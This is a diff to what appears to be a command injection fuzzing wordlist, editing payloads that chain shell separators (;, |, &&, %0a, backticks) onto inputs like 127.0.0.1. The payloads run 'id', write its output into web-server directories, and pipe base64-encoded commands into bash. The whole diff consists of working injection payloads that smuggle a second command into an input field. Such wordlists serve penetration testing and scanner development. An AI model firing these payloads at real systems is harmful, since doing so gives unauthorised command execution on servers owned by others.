@@ -70,10 +70,12 @@ x||ping+-c+10+127.0.0.1||
 ||id>/var/www/html/id.txt||
 ||nslookup+www.nsa.gov||
 x&&ping+-c+10+127.0.0.1||
-x&&ping+-c+10+127.0.0.1&&
+&&ping+-c+10+127.0.0.1&&
 |id
 &id
 ;id
+||id
+&&id
 %0aid%0a
 `id`
 $;/usr/bin/id
@@ -126,32 +128,33 @@ www.nsa.gov www.google.com
 www.nsa.gov, www.google.com
 www.nsa.gov; www.google.com
 www.nsa.gov&& www.google.com
-;id > /var/www/html/id1.txt
-&id > /var/www/html/id2.txt
-|id > /var/www/html/id3.txt
-&&id > /var/www/html/id4.txt
-%0aid > /var/www/html/id5.txt
-;id > /var/www/id1.txt
-&id > /var/www//id2.txt
-|id > /var/www/id3.txt
-&&id > /var/www/id4.txt
-%0aid > /var/www/id5.txt
-127.0.0.1|id > /var/www/html/id1.txt
-127.0.0.1|id > /var/www/id1.txt
-127.0.0.1;id > /var/www/html/id2.txt
-127.0.0.1;id > /var/www/id2.txt
-127.0.0.1&id > /var/www/html/id3.txt
-127.0.0.1&id > /var/www/id3.txt
-127.0.0.1&&id > /var/www/html/id4.txt
-127.0.0.1&&id > /var/www/id4.txt
-127.0.0.1%0aid > /var/www/html/id5.txt
-127.0.0.1%0aid > /var/www/id5.txt
-;echo "aWQK"|base64 -d|bash
-|echo "aWQK"|base64 -d|bash
-&echo "aWQK"|base64 -d|bash
-%0aecho "aWQK"|base64 -d|bash
-127.0.0.1;echo "aWQK"|base64 -d|bash
-127.0.0.1|echo "aWQK"|base64 -d|bash
-127.0.0.1&echo "aWQK"|base64 -d|bash
-127.0.0.1&&echo "aWQK"|base64 -d|bash
-127.0.0.1%0aecho "aWQK"|base64 -d|bash
+;id>/var/www/html/id1.txt
+&id>/var/www/html/id2.txt
+|id>/var/www/html/id3.txt
+||id>/var/www/html/id3.txt
+&&id>/var/www/html/id4.txt
+%0aid>/var/www/html/id5.txt
+;id>/var/www/id1.txt
+&id>/var/www//id2.txt
+|id>/var/www/id3.txt
+&&id>/var/www/id4.txt
+%0aid>/var/www/id5.txt
+127.0.0.1|id>/var/www/html/id1.txt
+127.0.0.1|id>/var/www/id1.txt
+127.0.0.1;id>/var/www/html/id2.txt
+127.0.0.1;id>/var/www/id2.txt
+127.0.0.1&id>/var/www/html/id3.txt
+127.0.0.1&id>/var/www/id3.txt
+127.0.0.1&&id>/var/www/html/id4.txt
+127.0.0.1&&id>/var/www/id4.txt
+127.0.0.1%0aid>/var/www/html/id5.txt
+127.0.0.1%0aid>/var/www/id5.txt
+;echo+"aWQK"|base64+-d|bash
+|echo+"aWQK"|base64+-d|bash
+&echo+"aWQK"|base64+-d|bash
+%0aecho+"aWQK"|base64+-d|bash
+127.0.0.1;echo+"aWQK"|base64+-d|bash
+127.0.0.1|echo+"aWQK"|base64+-d|bash
+127.0.0.1&echo+"aWQK"|base64+-d|bash
+127.0.0.1&&echo+"aWQK"|base64+-d|bash
+127.0.0.1%0aecho+"aWQK"|base64+-d|bash
